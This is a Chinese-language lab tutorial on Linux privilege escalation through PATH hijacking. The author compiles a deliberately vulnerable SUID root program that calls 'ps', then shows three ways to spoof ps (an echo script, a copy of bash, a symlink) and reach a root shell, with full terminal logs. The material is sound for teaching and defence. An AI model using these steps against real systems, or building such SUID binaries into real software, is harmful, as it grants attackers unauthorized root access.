# 使用 PATH 变量进行 Linux 权限提升
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
## 危险文件生成

首先生成一个可执行的文件，给上SUID权限
```bash
mkdir tmp
cd tmp
vim shell.c
```

```bash
┌──(root㉿fforu)-[~/workspace/tmp]
└─# cat shell.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
┌──(root㉿fforu)-[/home/fforu/workspace/tmp]
└─# gcc shell.c -o shell
shell.c: In function ‘main’:
shell.c:5:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |   system("ps");
      |   ^~~~~~
┌──(root㉿fforu)-[/home/fforu/workspace/tmp]
└─# ls -la
总计 28
drwxr-xr-x 2 fforu fforu  4096  4月 4日 16:23 .
drwxr-xr-x 3 fforu fforu  4096  4月 4日 15:28 ..
-rwxr-xr-x 1 root  root  16056  4月 4日 16:23 shell
-rw-r--r-- 1 fforu fforu    75  4月 4日 16:22 shell.c

┌──(root㉿fforu)-[/home/fforu/workspace/tmp]
└─# chmod u=s shell

┌──(root㉿fforu)-[/home/fforu/workspace/tmp]
└─# ls -la
总计 28
drwxr-xr-x 2 fforu fforu  4096  4月 4日 16:23 .
drwxr-xr-x 3 fforu fforu  4096  4月 4日 15:28 ..
---Sr-xr-x 1 root  root  16056  4月 4日 16:23 shell
-rw-r--r-- 1 fforu fforu    75  4月 4日 16:22 shell.c

```
该c程序调用了root的ps命令

### 1.echo
```bash
┌──(fforu㉿fforu)-[/tmp]
└─$ find /home -perm -4000 -type f  2>/dev/null
/home/fforu/workspace/tmp/shell

┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ cd /tmp

┌──(fforu㉿fforu)-[/tmp]
└─$ echo '/bin/bash' > ps

┌──(fforu㉿fforu)-[/tmp]
└─$ chmod 777 ps

┌──(fforu㉿fforu)-[/tmp]
└─$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(fforu㉿fforu)-[/tmp]
└─$ export PATH=/tmp:$PATH

┌──(fforu㉿fforu)-[/tmp]
└─$ cd ~/workspace/tmp/

┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ ./shell
┌──(root㉿fforu)-[~/workspace/tmp]
└─#whoami
root
```
将tmp目录放在第一个PATH，那么在执行命令的时候就会先去找tmp目录下的文件，运行shell程序时，系统在tmp目录找到ps可执行文件后，直接执行，其中ps的内容为`/bin/bash`
由此便提权了

### 2.cp

```bash
┌──(fforu㉿fforu)-[/tmp]
└─$ cp /bin/bash /tmp/ps

┌──(fforu㉿fforu)-[/tmp]
└─$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(fforu㉿fforu)-[/tmp]
└─$ export PATH=/tmp:$PATH

┌──(fforu㉿fforu)-[/tmp]
└─$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(fforu㉿fforu)-[/tmp]
└─$ cd ~/workspace/tmp

┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ ./shell
┌──(root㉿fforu)-[~/workspace/tmp]
└─#

```
将bash命令复制给ps文件，执行ps时相当于执行了bash

### 3.软链接
```bash
┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ ln -s /bin/bash ps

┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ export PATH=.:$PATH

┌──(fforu㉿fforu)-[~/workspace/tmp]
└─$ ./shell
┌──(root㉿fforu)-[~/workspace/tmp]
└─#

````